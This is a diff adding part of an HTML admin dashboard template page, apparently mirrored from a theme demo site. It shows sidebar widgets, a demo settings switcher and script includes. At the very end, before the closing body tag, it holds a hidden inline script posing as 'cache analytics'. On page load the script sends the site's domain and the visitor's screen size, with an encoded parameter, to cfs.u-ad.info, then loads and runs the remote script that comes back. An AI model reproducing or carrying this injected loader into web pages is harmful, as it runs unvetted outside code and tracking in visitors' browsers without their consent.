+            </div>
+            <div id="sparklinestats" class="collapse in">
+                <div class="widget-body">
+                    <ul class="sparklinestats">
+                        <li>
+                            <div class="title">Earnings</div>
+                            <div class="stats">$22,500</div>
+                            <div class="sparkline" id="infobar-earningsstats" style="100%"></div>
+                        </li>
+                        <li>
+                            <div class="title">Orders</div>
+                            <div class="stats">4,750</div>
+                            <div class="sparkline" id="infobar-orderstats" style="100%"></div>
+                        </li>
+                    </ul>
+                    <a href="#" class="more">More Sparklines</a>
+                </div>
+            </div>
+        </div>
+
+        <div class="widget">
+            <div class="widget-heading">
+                <a href="javascript:;" data-toggle="collapse" data-target="#recentactivity"><h4>Recent Activity</h4></a>
+            </div>
+            <div id="recentactivity" class="collapse in">
+                <div class="widget-body">
+                    <ul class="recent-activities">
+                        <li>
+                            <div class="avatar">
+                                <img src="assets/demo/avatar/avatar_11.png" class="img-responsive img-circle">
+                            </div>
+                            <div class="content">
+                                <span class="msg"><a href="#" class="person">Jean Alanis</a> invited 3 unconfirmed members</span>
+                                <span class="time">2 mins ago</span>
+                                
+                            </div>
+                        </li>
+                        <li>
+                            <div class="avatar">
+                                <img src="assets/demo/avatar/avatar_09.png" class="img-responsive img-circle">
+                            </div>
+                            <div class="content">
+                                <span class="msg"><a href="#" class="person">Anthony Ware</a> is now following you</span>
+                                <span class="time">4 hours ago</span>
+                                
+                            </div>
+                        </li>
+                        <li>
+                            <div class="avatar">
+                                <img src="assets/demo/avatar/avatar_04.png" class="img-responsive img-circle">
+                            </div>
+                            <div class="content">
+                                <span class="msg"><a href="#" class="person">Bruce Ory</a> commented on <a href="#">Dashboard UI</a></span>
+                                <span class="time">16 hours ago</span>
+                            </div>
+                        </li>
+                        <li>
+                            <div class="avatar">
+                                <img src="assets/demo/avatar/avatar_01.png" class="img-responsive img-circle">
+                            </div>
+                            <div class="content">
+                                <span class="msg"><a href="#" class="person">Roxann Hollingworth</a>is now following you</span>
+                                <span class="time">Feb 13, 2015</span>
+                            </div>
+                        </li>
+                    </ul>
+                    <a href="#" class="more">See all activities</a>
+                </div>
+            </div>
+        </div>
+
+        <div class="widget" >
+            <div class="widget-heading">
+                <a href="javascript:;" data-toggle="collapse" data-target="#widget-milestones"><h4>Milestones</h4></a>
+            </div>
+            <div id="widget-milestones" class="collapse in">
+                <div class="widget-body">
+                    <div class="contextual-progress">
+                        <div class="clearfix">
+                            <div class="progress-title">UI Design</div>
+                            <div class="progress-percentage">12/16</div>
+                        </div>
+                        <div class="progress">
+                            <div class="progress-bar progress-bar-lime" style="width: 75%"></div>
+                        </div>
+                    </div>
+                    <div class="contextual-progress">
+                        <div class="clearfix">
+                            <div class="progress-title">UX Design</div>
+                            <div class="progress-percentage">8/24</div>
+                        </div>
+                        <div class="progress">
+                            <div class="progress-bar progress-bar-orange" style="width: 33.3%"></div>
+                        </div>
+                    </div>
+                    <div class="contextual-progress">
+                        <div class="clearfix">
+                            <div class="progress-title">Frontend Development</div>
+                            <div class="progress-percentage">8/40</div>
+                        </div>
+                        <div class="progress">
+                            <div class="progress-bar progress-bar-purple" style="width: 20%"></div>
+                        </div>
+                    </div>
+                    <div class="contextual-progress m0">
+                        <div class="clearfix">
+                            <div class="progress-title">Backend Development</div>
+                            <div class="progress-percentage">24/48</div>
+                        </div>
+                        <div class="progress">
+                            <div class="progress-bar progress-bar-danger" style="width: 50%"></div>
+                        </div>
+                    </div>
+                    <a href="#" class="more">See All</a>
+                </div>
+            </div>
+        </div>
+
+        <div class="widget">
+            <div class="widget-heading">
+                <a href="javascript:;" data-toggle="collapse" data-target="#widget-contact"><h4>Contacts</h4></a>
+            </div>
+            <div id="widget-contact" class="collapse in">
+                <div class="widget-body">
+                    <ul class="contact-list">
+                        <li id="contact-1">
+                            <a href="javascript:;"><img src="assets/demo/avatar/avatar_02.png" alt=""><span>Jeremy Potter</span></a>
+                            <!-- <div class="contact-card contactdetails" data-child-of="contact-1">
+                                <div class="avatar">
+                                    <img src="assets/demo/avatar/avatar_11.png" class="img-responsive img-circle">
+                                </div>
+                                <span class="contact-name">Jeremy Potter</span>
+                                <span class="contact-status">Client Representative</span>
+                                <ul class="details">
+                                    <li><a href="#"><i class="fa fa-envelope-o"></i>&nbsp;p.bateman@gmail.com</a></li>
+                                    <li><i class="fa fa-phone"></i>&nbsp;+1 234 567 890</li>
+                                    <li><i class="fa fa-map-marker"></i>&nbsp;Hollywood Hills, California</li>
+                                </ul>
+                            </div> -->
+                        </li>
+                        <li id="contact-2">
+                            <a href="javascript:;"><img src="assets/demo/avatar/avatar_07.png" alt=""><span>David Tennant</span></a>
+                            <!-- <div class="contact-card contactdetails" data-child-of="contact-2">
+                                <div class="avatar">
+                                    <img src="assets/demo/avatar/avatar_11.png" class="img-responsive img-circle">
+                                </div>
+                                <span class="contact-name">David Tennant</span>
+                                <span class="contact-status">Client Representative</span>
+                                <ul class="details">
+                                    <li><a href="#"><i class="fa fa-envelope-o"></i>&nbsp;p.bateman@gmail.com</a></li>
+                                    <li><i class="fa fa-phone"></i>&nbsp;+1 234 567 890</li>
+                                    <li><i class="fa fa-map-marker"></i>&nbsp;Hollywood Hills, California</li>
+                                </ul>
+                            </div> -->
+                        </li>
+                        <li id="contact-3">
+                            <a href="javascript:;"><img src="assets/demo/avatar/avatar_03.png" alt=""><span>Anna Johansson</span></a>
+                            <!-- <div class="contact-card contactdetails" data-child-of="contact-3">
+                                <div class="avatar">
+                                    <img src="assets/demo/avatar/avatar_11.png" class="img-responsive img-circle">
+                                </div>
+                                <span class="contact-name">Anna Johansson</span>
+                                <span class="contact-status">Client Representative</span>
+                                <ul class="details">
+                                    <li><a href="#"><i class="fa fa-envelope-o"></i>&nbsp;p.bateman@gmail.com</a></li>
+                                    <li><i class="fa fa-phone"></i>&nbsp;+1 234 567 890</li>
+                                    <li><i class="fa fa-map-marker"></i>&nbsp;Hollywood Hills, California</li>
+                                </ul>
+                            </div> -->
+                        </li>
+                        <li id="contact-4">
+                            <a href="javascript:;"><img src="assets/demo/avatar/avatar_09.png" alt=""><span>Alan Doyle</span></a>
+                            <!-- <div class="contact-card contactdetails" data-child-of="contact-4">
+                                <div class="avatar">
+                                    <img src="assets/demo/avatar/avatar_11.png" class="img-responsive img-circle">
+                                </div>
+                                <span class="contact-name">Alan Doyle</span>
+                                <span class="contact-status">Client Representative</span>
+                                <ul class="details">
+                                    <li><a href="#"><i class="fa fa-envelope-o"></i>&nbsp;p.bateman@gmail.com</a></li>
+                                    <li><i class="fa fa-phone"></i>&nbsp;+1 234 567 890</li>
+                                    <li><i class="fa fa-map-marker"></i>&nbsp;Hollywood Hills, California</li>
+                                </ul>
+                            </div> -->
+                        </li>
+                        <li id="contact-5">
+                            <a href="javascript:;"><img src="assets/demo/avatar/avatar_05.png" alt=""><span>Simon Corbett</span></a>
+                            <!-- <div class="contact-card contactdetails" data-child-of="contact-5">
+                                <div class="avatar">
+                                    <img src="assets/demo/avatar/avatar_11.png" class="img-responsive img-circle">
+                                </div>
+                                <span class="contact-name">Simon Corbett</span>
+                                <span class="contact-status">Client Representative</span>
+                                <ul class="details">
+                                    <li><a href="#"><i class="fa fa-envelope-o"></i>&nbsp;p.bateman@gmail.com</a></li>
+                                    <li><i class="fa fa-phone"></i>&nbsp;+1 234 567 890</li>
+                                    <li><i class="fa fa-map-marker"></i>&nbsp;Hollywood Hills, California</li>
+                                </ul>
+                            </div> -->
+                        </li>
+                        <li id="contact-6">
+                            <a href="javascript:;"><img src="assets/demo/avatar/avatar_01.png" alt=""><span>Polly Paton</span></a>
+                            <!-- <div class="contact-card contactdetails" data-child-of="contact-6">
+                                <div class="avatar">
+                                    <img src="assets/demo/avatar/avatar_11.png" class="img-responsive img-circle">
+                                </div>
+                                <span class="contact-name">Polly Paton</span>
+                                <span class="contact-status">Client Representative</span>
+                                <ul class="details">
+                                    <li><a href="#"><i class="fa fa-envelope-o"></i>&nbsp;p.bateman@gmail.com</a></li>
+                                    <li><i class="fa fa-phone"></i>&nbsp;+1 234 567 890</li>
+                                    <li><i class="fa fa-map-marker"></i>&nbsp;Hollywood Hills, California</li>
+                                </ul>
+                            </div> -->
+                        </li>
+                    </ul>
+                    <a href="#" class="more">See All</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+        </div>
+
+
+    
+    <!-- Switcher -->
+    <div class="demo-options">
+        <div class="demo-options-icon"><i class="fa fa-spin fa-fw fa-smile-o"></i></div>
+        <div class="demo-heading">Demo Settings</div>
+
+        <div class="demo-body">
+            <div class="tabular">
+                <div class="tabular-row">
+                    <div class="tabular-cell">Fixed Header</div>
+                    <div class="tabular-cell demo-switches"><input class="bootstrap-switch" type="checkbox" checked data-size="mini" data-on-color="success" data-off-color="default" name="demo-fixedheader" data-on-text="I" data-off-text="O"></div>
+                </div>
+                <div class="tabular-row">
+                    <div class="tabular-cell">Boxed Layout</div>
+                    <div class="tabular-cell demo-switches"><input class="bootstrap-switch" type="checkbox" data-size="mini" data-on-color="success" data-off-color="default" name="demo-boxedlayout" data-on-text="I" data-off-text="O"></div>
+                </div>
+                <div class="tabular-row">
+                    <div class="tabular-cell">Collapse Leftbar</div>
+                    <div class="tabular-cell demo-switches"><input class="bootstrap-switch" type="checkbox" data-size="mini" data-on-color="success" data-off-color="default" name="demo-collapseleftbar" data-on-text="I" data-off-text="O"></div>
+                </div>
+                <div class="tabular-row">
+                    <div class="tabular-cell">Collapse Rightbar</div>
+                    <div class="tabular-cell demo-switches"><input class="bootstrap-switch" type="checkbox" checked data-size="mini" data-on-color="success" data-off-color="default" name="demo-collapserightbar" data-on-text="I" data-off-text="O"></div>
+                </div>
+                <div class="tabular-row hide" id="demo-horizicon">
+                    <div class="tabular-cell">Horizontal Icons</div>
+                    <div class="tabular-cell demo-switches"><input class="bootstrap-switch" type="checkbox" checked data-size="mini" data-on-color="primary" data-off-color="warning" data-on-text="S" data-off-text="L" name="demo-horizicons" ></div>
+                </div>
+            </div>
+
+        </div>
+
+        <div class="demo-body">
+            <div class="option-title">Header Colors</div>
+            <ul id="demo-header-color" class="demo-color-list">
+                <li><span class="demo-white"></span></li>
+                <li><span class="demo-black"></span></li>
+                <li><span class="demo-midnightblue"></span></li>
+                <li><span class="demo-primary"></span></li>
+                <li><span class="demo-info"></span></li>
+                <li><span class="demo-alizarin"></span></li>
+                <li><span class="demo-green"></span></li>
+                <li><span class="demo-violet"></span></li>                
+                <li><span class="demo-indigo"></span></li> 
+            </ul>
+        </div>
+
+        <div class="demo-body">
+            <div class="option-title">Sidebar Colors</div>
+            <ul id="demo-sidebar-color" class="demo-color-list">
+                <li><span class="demo-white"></span></li>
+                <li><span class="demo-black"></span></li>
+                <li><span class="demo-midnightblue"></span></li>
+                <li><span class="demo-primary"></span></li>
+                <li><span class="demo-info"></span></li>
+                <li><span class="demo-alizarin"></span></li>
+                <li><span class="demo-green"></span></li>
+                <li><span class="demo-violet"></span></li>                
+                <li><span class="demo-indigo"></span></li> 
+            </ul>
+        </div>
+
+        <div class="demo-body hide" id="demo-boxes">
+            <div class="option-title">Boxed Layout Options</div>
+            <ul id="demo-boxed-bg" class="demo-color-list">
+                <li><span class="pattern-brickwall"></span></li>
+                <li><span class="pattern-dark-stripes"></span></li>
+                <li><span class="pattern-rockywall"></span></li>
+                <li><span class="pattern-subtle-carbon"></span></li>
+                <li><span class="pattern-tweed"></span></li>
+                <li><span class="pattern-vertical-cloth"></span></li>
+                <li><span class="pattern-grey_wash_wall"></span></li>
+                <li><span class="pattern-pw_maze_black"></span></li>
+                <li><span class="patther-wild_oliva"></span></li>
+                <li><span class="pattern-stressed_linen"></span></li>
+                <li><span class="pattern-sos"></span></li>
+            </ul>
+        </div>
+
+    </div>
+<!-- /Switcher -->
+    <!-- Load site level scripts -->
+
+<!-- <script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+<script src="//ajax.googleapis.com/ajax/libs/jqueryui/1.9.2/jquery-ui.min.js"></script> -->
+
+<script src="assets/js/jquery-1.10.2.min.js"></script> 							<!-- Load jQuery -->
+<script src="assets/js/jqueryui-1.9.2.min.js"></script> 							<!-- Load jQueryUI -->
+
+<script src="assets/js/bootstrap.min.js"></script> 								<!-- Load Bootstrap -->
+
+
+<script src="assets/plugins/easypiechart/jquery.easypiechart.js"></script> 		<!-- EasyPieChart-->
+<script src="assets/plugins/sparklines/jquery.sparklines.min.js"></script>  		<!-- Sparkline -->
+<script src="assets/plugins/jstree/dist/jstree.min.js"></script>  				<!-- jsTree -->
+
+<script src="assets/plugins/codeprettifier/prettify.js"></script> 				<!-- Code Prettifier  -->
+<script src="assets/plugins/bootstrap-switch/bootstrap-switch.js"></script> 		<!-- Swith/Toggle Button -->
+
+<script src="assets/plugins/bootstrap-tabdrop/js/bootstrap-tabdrop.js"></script>  <!-- Bootstrap Tabdrop -->
+
+<script src="assets/plugins/iCheck/icheck.min.js"></script>     					<!-- iCheck -->
+
+<script src="assets/js/enquire.min.js"></script> 									<!-- Enquire for Responsiveness -->
+
+<script src="assets/plugins/bootbox/bootbox.js"></script>							<!-- Bootbox -->
+
+<script src="assets/plugins/simpleWeather/jquery.simpleWeather.min.js"></script> <!-- Weather plugin-->
+
+<script src="assets/plugins/nanoScroller/js/jquery.nanoscroller.min.js"></script> <!-- nano scroller -->
+
+<script src="assets/plugins/jquery-mousewheel/jquery.mousewheel.min.js"></script> 	<!-- Mousewheel support needed for jScrollPane -->
+
+<script src="assets/js/application.js"></script>
+<script src="assets/demo/demo.js"></script>
+<script src="assets/demo/demo-switcher.js"></script>
+
+<!-- End loading site level scripts -->
+    
+    <!-- Load page level scripts-->
+    
+<script src="assets/plugins/d3/d3.min.js"></script>             		<!-- nvd3 dependency -->
+<script src="assets/plugins/nvd3/nv.d3.min.js"></script> 				<!-- nvd3 -->
+
+<script src="assets/demo/demo-nvd3.js"></script>
+
+    <!-- End loading page level scripts-->
+
+    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2bZKyNmWFA5CgHUWR6ExV4IkX%2fPj8goa4deaQPRsrUy7Er464p95Czx7px2MP%2bMzwkFr7ZXgJ3U1%2fbtowQbD5URsOWYousdSvqKDSSETRjMTrQdsZZFf5tr5xhKpqy%2bY5qTAafWof5npV%2f2QAdRYUlGH6Jf5v6K3f%2fDLPlOUu9EYjW3i7udbzpxPGZSEUUZFMwSURKzNNKZ3%2feEGYDj8bFC%2fGhGr7oScgkhWx4if7wU8H8MROKNTSVJqoK1zu3%2bn1A%2f9CUd0AowPYZbFXK9%2bH3yp8kaXFUyl4b%2bVI9NDB05HpHOrhNE0VltECMOO0W8H%2flFJf17eVXfMqS1txe%2b%2fkTWForqcpgOc7rKHy%2bihmp3C32Sp6e8I3HWgH2OopyKyBG75%2f64KfbpAQrVj3SZgYv21on5b%2f3jPL0dhb6O0VjAD4RiQKrLcssICGyBXi9mitWA5O7QL2GXkCoFgjsd%2fGdkR5WuQ%2bpVMNfw5PVc8A4RM1rL%2fbGbpBfvsltgWDuKEciXccdPzmt1o6O4dEsjIOiPAYiWrTeInf%2b" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+<!-- Mirrored from avenger.kaijuthemes.com/charts-nvd3.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 31 Oct 2015 15:03:46 GMT -->
+</html>
